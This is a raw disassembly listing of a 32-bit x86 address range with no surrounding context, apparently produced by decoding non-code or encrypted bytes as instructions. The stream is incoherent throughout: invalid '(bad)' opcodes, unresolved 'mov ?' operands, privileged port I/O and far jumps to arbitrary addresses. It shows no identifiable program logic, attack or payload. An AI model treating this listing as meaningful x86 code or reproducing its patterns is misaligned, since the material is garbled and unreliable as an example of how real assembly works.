  411bda:	outs   dx,BYTE PTR ds:[esi]
  411bdb:	cwde   
  411bdc:	jg     0x411c4e
  411bde:	mov    eax,cs:0x36d65501
  411be4:	lods   al,BYTE PTR ds:[esi]
  411be5:	pop    esi
  411be6:	adc    al,0x80
  411be8:	jle    0x411c58
  411bea:	cmp    al,0xe6
  411bec:	cmp    edx,esi
  411bee:	and    ebx,DWORD PTR [eax]
  411bf0:	xor    eax,0xe2450e1
  411bf5:	imul   esp,esp,0xffffffef
  411bf8:	fist   DWORD PTR [ebp-0x531744e5]
  411bfe:	outs   dx,DWORD PTR fs:[esi]
  411c00:	fstp   DWORD PTR [ebx-0x39b8c882]
  411c06:	push   edi
  411c07:	jmp    0x90263722
  411c0c:	jnp    0x411c5f
  411c0e:	xor    ebx,edi
  411c10:	jg     0x411c5b
  411c12:	push   DWORD PTR [eax+eiz*4]
  411c15:	or     dl,bl
  411c17:	add    eax,0xc22a06ea
  411c1c:	aaa    
  411c1d:	fst    DWORD PTR [ecx+0xd56f3d9]
  411c23:	sti    
  411c24:	push   ecx
  411c25:	cld    
  411c26:	jns    0x411bea
  411c28:	mov    eax,ss
  411c2a:	nop
  411c2b:	aaa    
  411c2c:	xchg   esi,eax
  411c2d:	lods   al,BYTE PTR ds:[esi]
  411c2e:	ins    BYTE PTR es:[edi],dx
  411c2f:	xor    al,0x2e
  411c31:	je     0x411c1e
  411c33:	mov    cl,0x98
  411c35:	or     dl,BYTE PTR [esi+0xa]
  411c38:	pop    ds
  411c39:	mov    ch,0x15
  411c3b:	fld    DWORD PTR gs:[eax+0x1da26fd1]
  411c42:	in     eax,dx
  411c43:	nop
  411c44:	out    0xc1,al
  411c46:	jns    0x411c9c
  411c48:	push   cs
  411c49:	icebp  
  411c4a:	test   al,0xf5
  411c4c:	pop    ebx
  411c4d:	or     BYTE PTR [edx+ecx*4+0x34],bl
  411c51:	adc    edx,esp
  411c53:	dec    DWORD PTR [edi]
  411c55:	mov    bh,BYTE PTR [ecx]
  411c57:	fstp   TBYTE PTR [eax-0x51]
  411c5a:	dec    eax
  411c5b:	or     bh,BYTE PTR [edi+0x61]
  411c5e:	je     0x411c25
  411c60:	pop    eax
  411c61:	ins    BYTE PTR es:[edi],dx
  411c62:	mov    ebp,0x18ea0fa8
  411c67:	rol    DWORD PTR [edi+0x74cc64ec],1
  411c6d:	jnp    0x411c23
  411c6f:	mov    ds,WORD PTR [eax]
  411c71:	ja     0x411ce0
  411c73:	popf   
  411c74:	mov    ecx,0xd3ebdb1a
  411c79:	lahf   
  411c7a:	ret    
  411c7b:	jne    0x411cdb
  411c7d:	aam    0x74
  411c7f:	jecxz  0x411c1e
  411c81:	push   ds
  411c82:	(bad)  
  411c84:	test   eax,0x9a63fba0
  411c89:	xchg   ebp,eax
  411c8a:	xchg   ebp,eax
  411c8b:	sti    
  411c8c:	sub    al,0x93
  411c8e:	push   esi
  411c8f:	push   es
  411c90:	outs   dx,BYTE PTR ds:[esi]
  411c91:	xor    ah,BYTE PTR [eax+0x7b00426c]
  411c97:	inc    ebp
  411c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c99:	ins    BYTE PTR es:[edi],dx
  411c9a:	fist   DWORD PTR [edx]
  411c9c:	ret    0x5053
  411c9f:	dec    eax
  411ca0:	mul    dl
  411ca2:	in     al,dx
  411ca3:	data16 or cl,BYTE PTR [esi]
  411ca6:	cmp    eax,0x71b0b7e1
  411cab:	jmp    0x1f65:0x575178fd
  411cb2:	xor    eax,0x7257341d
  411cb7:	cli    
  411cb8:	outs   dx,DWORD PTR ds:[esi]
  411cb9:	aad    0xc1
  411cbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cbc:	jmp    0xf5297655
  411cc1:	cmp    DWORD PTR [ebx],edi
  411cc3:	shl    BYTE PTR [ebp-0x45],cl
  411cc6:	cmp    eax,0xd8724083
  411ccb:	fcomp  DWORD PTR [eax]
  411ccd:	mov    al,0x76
  411ccf:	push   ebp
  411cd0:	inc    esp
  411cd1:	loopne 0x411d10
  411cd3:	ja     0x411c60
  411cd5:	mov    ah,0x49
  411cd7:	enter  0x3b81,0x22
  411cdb:	sbb    ch,BYTE PTR [eax+edi*1]
  411cde:	ins    BYTE PTR es:[edi],dx
  411cdf:	icebp  
  411ce0:	and    BYTE PTR [esi-0x50],cl
  411ce3:	rol    DWORD PTR [esi+edx*8+0x4f8fb2bf],0x2e
  411ceb:	shr    BYTE PTR ss:[edx],1
  411cee:	hlt    
  411cef:	(bad)  
  411cf1:	jo     0x411c7e
  411cf3:	dec    al
  411cf5:	fiadd  DWORD PTR [edi+0x79]
  411cf8:	fist   DWORD PTR [edx+0x41]
  411cfb:	nop
  411cfc:	xchg   esi,eax
  411cfd:	jno    0x411d56
  411cff:	ins    DWORD PTR es:[edi],dx
  411d00:	jmp    0xb1fb:0x7a9ded19
  411d07:	cs (bad) 
  411d09:	ffreep st(3)
  411d0b:	sar    BYTE PTR [eax+0x63df6057],0x1e
  411d12:	mov    ebx,0xdabf4c79
  411d17:	and    dl,bl
  411d19:	xchg   edi,eax
  411d1a:	jb     0x411cb2
  411d1c:	and    DWORD PTR [ebp-0x6142af03],esi
  411d22:	inc    esi
  411d23:	mov    ecx,0xa37d52e6
  411d28:	dec    ebp
  411d29:	pop    eax
  411d2a:	pop    ebx
  411d2b:	outs   dx,DWORD PTR ds:[esi]
  411d2c:	es adc al,0x53
  411d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d30:	pop    ecx
  411d31:	xchg   ebx,eax
  411d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d33:	rol    DWORD PTR [ebx-0x33],0x93
  411d37:	xchg   edx,eax
  411d38:	mov    dl,0xfb
  411d3a:	outs   dx,BYTE PTR ds:[esi]
  411d3b:	arpl   WORD PTR [ebp+0x2b346930],dx
  411d41:	hlt    
  411d42:	test   al,0xae
  411d44:	jp     0x411d29
  411d46:	push   esi
  411d47:	psubusb mm6,QWORD PTR [eax-0x2e8fece4]
  411d4e:	fnsave [edi+0x3c]
  411d51:	xchg   ecx,eax
  411d52:	xor    al,0x28
  411d54:	leave  
  411d55:	das    
  411d56:	adc    al,0xea
  411d58:	into   
  411d59:	adc    eax,0x472335d3
  411d5e:	outs   dx,DWORD PTR ds:[esi]
  411d5f:	mov    DWORD PTR [ebx-0x38],esi
  411d62:	mov    edx,0x465c0cea
  411d67:	lahf   
  411d68:	adc    BYTE PTR [ebx+0x58],bh
  411d6b:	sar    BYTE PTR [eax-0x31],1
  411d6e:	hlt    
  411d6f:	mov    dl,0x49
  411d71:	f2xm1  
  411d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d74:	les    eax,FWORD PTR [edx+esi*4+0x30]
  411d78:	dec    ecx
  411d79:	fcmovnb st,st(2)
  411d7b:	pop    ecx
  411d7c:	or     al,0xf2
  411d7e:	xchg   edi,eax
  411d7f:	push   eax
  411d80:	ret    0xdf81
  411d83:	and    dl,0xe2
  411d86:	aam    0xcb
  411d88:	imul   DWORD PTR ds:0x7c243642
  411d8e:	jo     0x411d77
  411d90:	cmp    dh,0x1a
  411d93:	sahf   
  411d94:	test   eax,0x9db32d99
  411d99:	push   cs
  411d9a:	aas    
  411d9b:	das    
  411d9c:	nop
  411d9d:	inc    edi
  411d9e:	mov    edx,0x70fa8a44
  411da3:	sar    DWORD PTR [edi],0xe4
  411da6:	dec    ebp
  411da7:	sbb    BYTE PTR [bx+di+0x64],bl
  411dab:	stos   DWORD PTR es:[edi],eax
  411dac:	jo     0x411dda
  411dae:	dec    esi
  411daf:	cld    
  411db0:	sub    DWORD PTR [esi+0x12],ebp
  411db3:	leave  
  411db4:	mov    WORD PTR [ebx+esi*8],?
  411db7:	out    dx,al
  411db8:	adc    DWORD PTR [esi],ebp
  411dba:	imul   esi,DWORD PTR [ebx+ebp*1],0x182d6549
  411dc1:	mov    esi,0x17d5e5a5
  411dc6:	mov    DWORD PTR [edi-0x5ad0f921],eax
  411dcc:	loope  0x411d53
  411dce:	ins    DWORD PTR es:[edi],dx
  411dcf:	pop    eax
  411dd0:	add    bl,BYTE PTR [edi-0xf1c2a89]
  411dd6:	xor    DWORD PTR [ebx],ebx
  411dd8:	pop    eax
  411dd9:	pop    ss
  411dda:	call   0x4a6c93e6
  411ddf:	inc    edi
  411de0:	push   edx
  411de1:	pop    ecx
  411de2:	and    DWORD PTR [ecx],edi
  411de4:	repnz cld 
  411de6:	inc    ebp
  411de7:	pop    ss
  411de8:	inc    edx
  411de9:	inc    ecx
  411dea:	xor    ah,BYTE PTR [edi-0x6b]
  411ded:	out    0x30,al
  411def:	mov    eax,ds:0x32b1d877
  411df4:	and    DWORD PTR [edi],ebp
  411df6:	aam    0xc4
  411df8:	sub    BYTE PTR [ebx+0x29],ah
  411dfb:	fisub  DWORD PTR [eax]
  411dfd:	lock pop ds
  411dff:	xchg   ebx,eax
  411e00:	push   0xffffffb6
  411e02:	movzx  ebx,dh
  411e05:	xchg   ecx,eax
  411e06:	xchg   esi,eax
  411e07:	sub    BYTE PTR [esi+0x4c],bl
  411e0a:	sbb    eax,0xf2e065e1
  411e0f:	pop    ebx
  411e10:	into   
  411e11:	ss jle 0x411e12
  411e14:	lea    esp,[ebx+edi*1+0x8]
  411e18:	popa   
  411e19:	sahf   
  411e1a:	out    0x7f,al
  411e1c:	inc    DWORD PTR [ebx+0x67]
  411e1f:	push   eax
  411e20:	pusha  
  411e21:	outs   dx,BYTE PTR ds:[esi]
  411e22:	jbe    0x411e2d
  411e24:	out    dx,al
  411e25:	xchg   ebp,eax
  411e26:	fucomi st,st(2)
  411e28:	xchg   esp,eax
  411e29:	(bad)  
  411e2a:	out    0xfa,al
  411e2c:	mov    dh,0xdf
  411e2e:	jns    0x411e32
  411e30:	xchg   ebp,eax
  411e31:	jb     0x411eaf
  411e33:	add    BYTE PTR [ebx],ch
  411e35:	loope  0x411ea2
  411e37:	dec    edi
  411e38:	xor    cl,dl
  411e3a:	test   eax,0xf7327912
  411e3f:	xchg   ebx,eax
  411e40:	pop    esp
  411e41:	mov    eax,DWORD PTR [esi]
  411e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e45:	add    edi,DWORD PTR [edx+0x50]
  411e48:	xor    ebx,edi
  411e4a:	mov    ds:0xf38a9f1,al
  411e4f:	popf   
  411e50:	call   0xffaf:0x9953caa9
  411e57:	inc    esp
  411e58:	xor    DWORD PTR [ecx+0x6e],esp
  411e5b:	sbb    edx,DWORD PTR [edi]
  411e5d:	aas    
  411e5e:	test   DWORD PTR [ebx],edi
  411e60:	outs   dx,BYTE PTR ds:[esi]
  411e61:	sahf   
  411e62:	cmp    eax,0x9ae48158
  411e67:	and    ebp,eax
  411e69:	ficom  WORD PTR [ebx]
  411e6b:	inc    esp
  411e6c:	mov    DWORD PTR [esi-0x48c3dc11],esi
  411e72:	arpl   cx,si
  411e74:	pop    ebx
  411e75:	sub    BYTE PTR [edx+0x10ae3166],0x57
  411e7c:	scas   al,BYTE PTR es:[edi]
  411e7d:	jl     0x411e01
  411e7f:	out    dx,al
  411e80:	mov    ebp,0x25158ff8
  411e85:	int3   
  411e86:	test   DWORD PTR [ebx+0x7b],esp
  411e89:	cdq    
  411e8a:	push   ecx
  411e8b:	and    BYTE PTR [edi+0x20],bh
  411e8e:	xchg   ebp,eax
  411e8f:	imul   edx,DWORD PTR ds:0xb857e835,0x75
  411e96:	push   ds
  411e97:	shl    edi,cl
  411e99:	enter  0xc1b6,0xaa
  411e9d:	pop    eax
  411e9e:	call   0xbc3107fb
  411ea3:	fs push edx
  411ea5:	xchg   ecx,eax
  411ea6:	xchg   edx,eax
  411ea7:	sbb    eax,0x86363c0a
  411eac:	pushf  
  411ead:	mov    DWORD PTR [edi-0x3d],0xeb3aff31
  411eb4:	sub    bh,bl
  411eb6:	cmp    al,0xf
  411eb8:	mov    eax,ds:0xe29ed92c
  411ebd:	jae    0x411ed2
  411ebf:	cmp    eax,0xdefc8214
  411ec4:	xchg   edi,eax
  411ec5:	popa   
  411ec6:	dec    esi
  411ec7:	cmp    DWORD PTR [ebx+0x7f],esp
  411eca:	inc    ebx
  411ecb:	(bad)  
  411ecc:	shr    DWORD PTR [ebx+0x3c],1
  411ecf:	call   0x986c:0xcb6a8ecb
  411ed6:	repz mov dh,0x9e
  411ed9:	pop    ecx
  411eda:	outs   dx,BYTE PTR ds:[esi]
  411edb:	test   BYTE PTR [edi+esi*4-0x27],0xe
  411ee0:	push   cs
  411ee1:	mov    edi,0x95d162c7
  411ee6:	mov    dh,0x6e
  411ee8:	mov    ecx,DWORD PTR [esi]
  411eea:	sti    
  411eeb:	or     eax,0x674d45b6
  411ef0:	fcmovu st,st(0)
  411ef2:	aaa    
  411ef3:	cmp    BYTE PTR [edx-0x54046aae],0x57
  411efa:	mov    cl,0x6a
  411efc:	fst    st(6)
  411efe:	mov    ss,WORD PTR [ebx]
  411f00:	add    DWORD PTR [ebx-0x518a178f],ebp
  411f06:	jnp    0x411ee8
  411f08:	cwde   
  411f09:	cmp    esp,DWORD PTR [edi]
  411f0b:	nop
  411f0c:	or     ecx,DWORD PTR ds:[edi+0x7c]
  411f10:	mov    bl,0xa9
  411f12:	inc    esp
  411f13:	and    al,0x94
  411f15:	xlat   BYTE PTR ds:[ebx]
  411f16:	imul   esi,DWORD PTR [edx],0x56
  411f19:	xchg   DWORD PTR [ebx-0x27],eax
  411f1c:	cli    
  411f1d:	jne    0x411f8b
  411f1f:	push   ecx
  411f20:	jmp    0xd3d37b04
  411f25:	push   eax
  411f26:	repz and al,0x55
  411f29:	hlt    
  411f2a:	mov    bl,0x9d
  411f2c:	int3   
  411f2d:	lock mov esi,0x7338de34
  411f33:	into   
  411f34:	mov    edx,0x99c2b3ed
  411f39:	mov    ch,0x53
  411f3b:	sbb    DWORD PTR [edi+0x2e],0x3b
  411f3f:	push   eax
  411f40:	leave  
  411f41:	(bad)  
  411f42:	call   0x139c:0xc2cf0bd5
  411f49:	sbb    DWORD PTR [edi],edi
  411f4b:	sub    dl,cl
  411f4d:	mov    dh,0x40
  411f4f:	rcr    DWORD PTR [ebx],0x86
  411f52:	cmp    DWORD PTR [edi-0x5],edx
  411f55:	xchg   esp,eax
  411f56:	(bad)  
  411f58:	jae    0x411f21
  411f5a:	test   eax,0xbb9bfe67
  411f5f:	stos   BYTE PTR es:[edi],al
  411f60:	into   
  411f61:	push   ds
  411f62:	(bad)  
  411f63:	shr    BYTE PTR [ebx],1
  411f65:	sub    DWORD PTR ds:0xfa450160,edx
  411f6b:	test   eax,0x15f608ae
  411f70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f71:	pop    edx
  411f72:	out    dx,al
  411f73:	push   cs
  411f74:	xchg   al,bh
  411f76:	cmp    DWORD PTR [ebp-0x1],edx
  411f79:	xor    edx,esi
  411f7b:	ja     0x411f77
  411f7d:	bound  dx,DWORD PTR [ecx-0x13]
  411f81:	inc    DWORD PTR [ebp+0x6f]
  411f84:	jl     0x411f31
  411f86:	adc    esp,eax
  411f88:	push   eax
  411f89:	pop    ecx
  411f8a:	call   0xea371ebe
  411f8f:	int3   
  411f90:	(bad)  
  411f92:	jg     0x411f92
  411f94:	mov    ah,0x74
  411f96:	sahf   
  411f97:	bound  edx,QWORD PTR [ecx+0x77]
  411f9a:	push   eax
  411f9b:	pop    ecx
  411f9c:	adc    bl,dh
  411f9e:	loopne 0x411f4a
  411fa0:	test   DWORD PTR [ebp-0x11],esi
  411fa3:	gs pop esi
  411fa5:	aam    0xab
  411fa7:	bound  esi,QWORD PTR [esi+0x1029d0dc]
  411fad:	es gs sbb al,0xb
  411fb1:	adc    eax,0x7765b814
  411fb6:	fdivr  QWORD PTR [esp+eax*4]
  411fb9:	test   BYTE PTR ds:0x5cd40ca6,bl
  411fbf:	fistp  QWORD PTR [edi-0x7c]
  411fc2:	mov    bl,0xd6
  411fc4:	jae    0x411f9d
  411fc6:	adc    eax,0x6c91df69
  411fcb:	and    DWORD PTR [ecx-0xe],0xfffffff3
  411fcf:	aas    
  411fd0:	dec    ebp
  411fd1:	and    DWORD PTR [edx+0x611820ab],ebp
  411fd7:	xlat   BYTE PTR ds:[ebx]
  411fd8:	out    dx,eax
  411fd9:	jle    0x411fe8
  411fdb:	xor    eax,DWORD PTR [edi]
  411fdd:	lahf   
  411fde:	ja     0x412056
  411fe0:	cmp    eax,0x1ca2b3af
  411fe5:	jecxz  0x412032
  411fe7:	or     ch,BYTE PTR [esi+0x6bd048b2]
  411fed:	lds    ebx,FWORD PTR [eax+0x4f]
  411ff0:	mov    eax,DWORD PTR [ecx-0x66fe4080]
  411ff6:	xchg   BYTE PTR [edi-0x71],cl
  411ff9:	jmp    0x412031
  411ffb:	dec    esi
  411ffc:	(bad)  
  411ffd:	(bad)  
  411fff:	jae    0x412059
  412001:	fild   DWORD PTR [edi]
  412003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412004:	cs clc 
  412006:	icebp  
  412007:	jno    0x411f9c
  412009:	pop    edi
  41200a:	inc    ebp
  41200b:	inc    BYTE PTR [eax+ebp*2-0x48]
  41200f:	cld    
  412010:	adc    al,0x81
  412012:	daa    
  412013:	jb     0x411fd5
  412015:	popf   
  412016:	sbb    al,bh
  412018:	loope  0x411fa8
  41201a:	jg     0x412048
  41201c:	sbb    al,BYTE PTR [ebp-0x78]
  41201f:	jmp    0x41205b
  412021:	call   DWORD PTR [edi]
  412023:	aas    
  412024:	nop
  412025:	out    0x7a,al
  412027:	sub    esi,DWORD PTR [ecx]
  412029:	fiadd  WORD PTR [esi+ebx*1+0x19]
  41202d:	lea    esp,[edx+0x81f4112]
  412033:	push   0x81a3ca21
  412038:	rol    DWORD PTR [esi-0x5686eb8e],cl
  41203e:	(bad)  
  41203f:	adc    al,cl
  412041:	inc    edx
  412042:	cmp    edi,ebx
  412044:	sub    eax,0x95626e68
  412049:	sub    cl,BYTE PTR ds:0x5461bfb7
  41204f:	or     eax,0x47c21a38
  412054:	mov    ah,0x9a
  412056:	fcomp  st(6)
  412058:	out    dx,eax
  412059:	cmp    DWORD PTR [ebx-0x275587ef],esp
  41205f:	lds    ebp,FWORD PTR [edi-0x7951718f]
  412065:	lods   eax,DWORD PTR ds:[esi]
  412066:	push   0x63
  412068:	cwde   
  412069:	clc    
  41206a:	fsubr  DWORD PTR [edi-0x7c810665]
  412070:	and    dl,BYTE PTR [edx-0x387e0600]
  412076:	dec    edi
  412077:	cmp    eax,0x6fef2b55
  41207c:	in     al,0xc6
  41207e:	inc    ebx
  41207f:	ficomp WORD PTR fs:[edi+0x42e37cf8]
  412086:	outs   dx,BYTE PTR ds:[esi]
  412087:	out    dx,eax
  412088:	pop    edx
  412089:	inc    esp
  41208a:	sbb    ah,bh
  41208c:	ins    DWORD PTR es:[edi],dx
  41208d:	xchg   BYTE PTR [esi],dh
  41208f:	shl    DWORD PTR [ecx],cl
  412091:	pop    ebp
  412092:	lods   al,BYTE PTR ds:[esi]
  412093:	popf   
  412094:	mov    dh,0xc
  412096:	scas   al,BYTE PTR es:[edi]
  412097:	in     eax,dx
  412098:	jle    0x41210f
  41209a:	aam    0xc2
  41209c:	pop    ss
  41209d:	and    BYTE PTR [edi],ch
  41209f:	bound  edx,QWORD PTR [eax+0x6fd927f5]
  4120a5:	sub    bh,dl
  4120a7:	or     DWORD PTR [esi-0x18],esi
  4120aa:	xchg   DWORD PTR [ecx-0x18],esi
  4120ad:	call   0x5db1f42
  4120b2:	inc    esp
  4120b3:	out    0xed,al
  4120b5:	sub    al,0x20
  4120b7:	repz ror BYTE PTR cs:[esi-0x33],0x62
  4120bd:	int3   
  4120be:	call   0x82314c0d
  4120c3:	scas   al,BYTE PTR es:[edi]
  4120c4:	cdq    
  4120c5:	in     eax,dx
  4120c6:	pop    es
  4120c7:	xchg   ebx,eax
  4120c8:	icebp  
  4120c9:	arpl   WORD PTR [eax+eiz*8],ax
  4120cc:	js     0x4120d7
  4120ce:	ins    BYTE PTR es:[edi],dx
  4120cf:	sub    al,0xf5
  4120d1:	xchg   edi,eax
  4120d2:	jmp    0x4120c9
  4120d4:	and    cl,BYTE PTR [eax-0x5d]
  4120d7:	and    al,bl
  4120d9:	inc    ebp
  4120da:	clc    
  4120db:	push   0xffffff8f
  4120dd:	(bad)  
  4120df:	pop    ss
  4120e0:	jmp    0x412069
  4120e2:	je     0x412146
  4120e4:	mov    al,0x99
  4120e6:	aaa    
  4120e7:	xchg   edx,eax
  4120e8:	popa   
  4120e9:	pop    ecx
  4120ea:	adc    BYTE PTR [ecx],0xc5
  4120ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120ee:	call   FWORD PTR [edi]
  4120f0:	scas   al,BYTE PTR es:[edi]
  4120f1:	push   esp
  4120f2:	jb     0x412166
  4120f4:	xlat   BYTE PTR ds:[ebx]
  4120f5:	xor    cl,bh
  4120f7:	(bad)  
  4120f8:	dec    ebx
  4120f9:	push   0xffffffb9
  4120fb:	call   0x1787:0x77e41544
  412102:	dec    esp
  412103:	jle    0x4120a0
  412105:	dec    ecx
  412106:	push   ss
  412107:	jb     0x412146
  412109:	mov    ecx,edx
  41210b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41210d:	ret    
  41210e:	rol    ah,1
  412110:	cld    
  412111:	mov    ah,0xb5
  412113:	cmp    al,0x78
  412115:	pop    edi
  412116:	push   ebx
  412117:	mov    esi,0xc17c7846
  41211c:	adc    dl,dl
  41211e:	jg     0x412151
  412120:	or     ebx,eax
  412122:	call   0xd961:0x5949aaf5
  412129:	mov    eax,ds:0xed25477b
  41212e:	adc    DWORD PTR [edi],0x29381c44
  412134:	mov    cl,0x3b
  412136:	mov    ?,ebx
  412138:	fdivr  st(0),st
  41213a:	or     eax,DWORD PTR [ebp-0x59]
  41213d:	ins    DWORD PTR es:[edi],dx
  41213e:	and    BYTE PTR [edi-0x28bb2bfe],cl
  412144:	fidiv  WORD PTR [edx+0x18]
  412147:	mov    dl,0x78
  412149:	scas   eax,DWORD PTR es:[edi]
  41214a:	jg     0x41212f
  41214c:	es fs mov bl,cl
  412150:	sbb    DWORD PTR [ebp-0x165ebd75],edi
  412156:	test   eax,0xe69503cc
  41215b:	jne    0x4121cb
  41215d:	xchg   ecx,eax
  41215e:	test   DWORD PTR [edi],ebp
  412160:	add    eax,ecx
  412162:	shr    esp,cl
  412164:	aas    
  412165:	out    0x13,al
  412167:	pop    eax
  412168:	mov    WORD PTR [edx+0xb905855],?
  41216e:	push   cs
  41216f:	inc    ebx
  412170:	mov    cl,0x81
  412172:	sbb    ch,BYTE PTR [ecx-0x23]
  412175:	stos   DWORD PTR es:[edi],eax
  412176:	push   DWORD PTR [ebx]
  412178:	popf   
  412179:	or     DWORD PTR [edx+0x5560c757],esp
  41217f:	jmp    0xba93773b
  412184:	and    ecx,eax
  412186:	mov    al,BYTE PTR [edx-0x7d]
  412189:	sbb    al,BYTE PTR [eax+0x3d]
  41218c:	outs   dx,BYTE PTR ds:[esi]
  41218d:	mov    edx,0x261f1ba9
  412192:	push   0x9aee23fd
  412197:	jne    0x4121be
  412199:	cli    
  41219a:	xor    eax,0x612391e3
  41219f:	mov    gs,WORD PTR [edx-0x45ca208a]
  4121a5:	enter  0xcb12,0xcf
  4121a9:	lahf   
  4121aa:	and    eax,0xd45e75d0
  4121af:	cmc    
  4121b0:	js     0x412174
  4121b2:	push   esp
  4121b3:	jne    0x4121d4
  4121b5:	lods   al,BYTE PTR ds:[esi]
  4121b6:	or     al,0x6c
  4121b8:	dec    ecx
  4121b9:	sar    dl,1
  4121bb:	aam    0xa1
  4121bd:	or     BYTE PTR [edx],al
  4121bf:	xchg   ecx,eax
  4121c0:	stc    
  4121c1:	pusha  
  4121c2:	push   eax
  4121c3:	in     al,dx
  4121c4:	inc    ecx
  4121c5:	push   ebx
  4121c6:	(bad)  
  4121c8:	jg     0x4121af
  4121ca:	xor    DWORD PTR [ebx-0x24],edx
  4121cd:	in     eax,dx
  4121ce:	in     al,dx
  4121cf:	push   ebp
  4121d0:	push   esi
  4121d1:	ror    BYTE PTR [ebp+0x63],0xc0
  4121d5:	pop    es
  4121d6:	js     0x4121c1
  4121d8:	sahf   
  4121d9:	jnp    0x4121b4
  4121db:	mov    ebp,DWORD PTR [ebp-0x1a]
  4121de:	xchg   esp,eax
  4121df:	sbb    esi,DWORD PTR [esp+eax*8-0x6cedd792]
  4121e6:	into   
  4121e7:	cmc    
  4121e8:	fwait
  4121e9:	push   edx
  4121ea:	into   
  4121eb:	adc    eax,0x13f37bb6
  4121f0:	dec    ebp
  4121f1:	push   eax
  4121f2:	pop    ebp
  4121f3:	scas   eax,DWORD PTR es:[edi]
  4121f4:	ss fprem 
  4121f7:	add    ch,BYTE PTR [edi+0x3dcd4e03]
  4121fd:	xlat   BYTE PTR ds:[ebx]
  4121fe:	push   esi
  4121ff:	mov    al,ds:0x8e846d91
  412204:	inc    edx
  412205:	lahf   
  412206:	outs   dx,DWORD PTR ds:[esi]
  412207:	(bad)  
  412208:	mov    ds:0x2dc6993f,al
  41220d:	mov    dh,0xba
  41220f:	fwait
  412210:	add    ecx,DWORD PTR [edi]
  412212:	jmp    0x412197
  412214:	(bad)  
  412215:	in     eax,dx
  412216:	int3   
  412217:	dec    ecx
  412218:	mov    ebx,0x85b9f5c5
  41221d:	and    DWORD PTR [eax+0xd70fa66],ebp
  412223:	lods   eax,DWORD PTR ds:[esi]
  412224:	xchg   esp,eax
  412225:	test   al,0xf3
  412227:	jmp    0x4121ee
  412229:	js     0x4121b4
  41222b:	(bad)  
  41222c:	int3   
  41222d:	cmc    
  41222e:	or     al,0xee
  412230:	popf   
  412231:	mov    ebp,0x169e671
  412236:	sbb    eax,0xa5ff8fba
  41223b:	in     eax,0xc
  41223d:	pushf  
  41223e:	jae    0x412273
  412240:	fwait
  412241:	mov    ds:0x75e48969,al
  412246:	pop    esp
  412247:	push   esi
  412248:	mov    ss,esp
  41224a:	mov    ebp,DWORD PTR [eax-0x42]
  41224d:	sub    eax,0x93421734
  412252:	jae    0x4121f5
  412254:	xor    ecx,0x8
  412257:	leave  
  412258:	mov    cl,0x29
  41225a:	pop    ss
  41225b:	add    eax,0x213cadd0
  412260:	dec    ebx
  412261:	clc    
  412262:	inc    ebp
  412263:	sub    ebx,DWORD PTR [ebp-0x6a16ad31]
  412269:	stos   DWORD PTR es:[edi],eax
  41226a:	popa   
  41226b:	add    eax,0x8aa4548f
  412270:	xchg   edi,eax
  412271:	icebp  
  412272:	inc    edi
  412273:	rcr    esp,0xf
  412276:	das    
  412277:	xchg   edi,eax
  412278:	js     0x412288
  41227a:	mov    ebx,0x3cb55a54
  41227f:	mov    al,0x47
  412281:	mov    ebx,0xbedd0a3c
  412286:	jg     0x4122ce
  412288:	imul   esp,DWORD PTR [ebx-0x24],0xab9c234b
  41228f:	and    eax,0x2d0f3a99
  412294:	and    edi,DWORD PTR [edx]
  412296:	xor    dl,BYTE PTR [ebp+0x304a8f28]
  41229c:	sbb    BYTE PTR [ecx+0x7f57a02f],al
  4122a2:	das    
  4122a3:	sbb    al,0xdc
  4122a5:	aad    0xec
  4122a7:	xor    cl,BYTE PTR [esi-0x3219c618]
  4122ad:	inc    edi
  4122ae:	aad    0x87
  4122b0:	ds sbb al,0x5e
  4122b3:	sub    al,0x87
  4122b5:	lods   al,BYTE PTR ds:[esi]
  4122b6:	js     0x4122aa
  4122b8:	leave  
  4122b9:	sub    eax,DWORD PTR [ecx+0x2b5f68b3]
  4122bf:	push   ss
  4122c0:	dec    esi
  4122c1:	loop   0x41233e
  4122c3:	jp     0x412293
  4122c5:	sahf   
  4122c6:	std    
  4122c7:	out    dx,eax
  4122c8:	pop    ds
  4122c9:	adc    ah,BYTE PTR [esi-0x5c]
  4122cc:	jg     0x4122c3
  4122ce:	sub    eax,0x2a9e959
  4122d3:	cmp    cl,BYTE PTR [ecx-0x10394ced]
  4122d9:	shl    BYTE PTR [ecx],cl
  4122db:	div    ebp
  4122dd:	repz mov ebx,0x5a5eaeda
  4122e3:	mov    ebx,ebp
  4122e5:	ret    0x272b
  4122e8:	dec    ebx
  4122e9:	(bad)  
  4122ea:	repnz test al,0x3a
  4122ed:	dec    edi
  4122ee:	push   cs
  4122ef:	sbb    DWORD PTR [eax+ecx*8],0x5d346892
  4122f6:	out    dx,al
  4122f7:	ficom  WORD PTR [ecx+ecx*4+0x20]
  4122fb:	jmp    0x412355
  4122fd:	adc    BYTE PTR [esi-0x80],bh
  412300:	sub    esi,0x45
  412303:	pop    ebp
  412304:	dec    esp
  412305:	jae    0x4122c6
  412307:	add    ebp,ecx
  412309:	sbb    dl,0xf8
  41230c:	sbb    esi,DWORD PTR [edi]
  41230e:	jmp    0x41230c
  412310:	pop    edi
  412311:	mov    WORD PTR ds:0x4f89c4e3,?
  412317:	int3   
  412318:	pop    ss
  412319:	repz cs mov esi,0xa9aeca00
  412320:	or     DWORD PTR [ebp-0x13],0x6606b74d
  412327:	push   esi
  412328:	mov    ch,0xbc
  41232a:	test   eax,0x51769808
  41232f:	mov    edx,0x550658e4
  412334:	ds stos DWORD PTR es:[edi],eax
  412336:	pop    ebp
  412337:	test   DWORD PTR [edx],esp
  412339:	and    BYTE PTR [ebp-0x8],bl
  41233c:	xchg   ecx,eax
  41233d:	int    0x1a
  41233f:	cmp    eax,0xdd9f4005
  412344:	outs   dx,BYTE PTR ds:[esi]
  412345:	pop    ss
  412346:	xlat   BYTE PTR ds:[ebx]
  412347:	pop    es
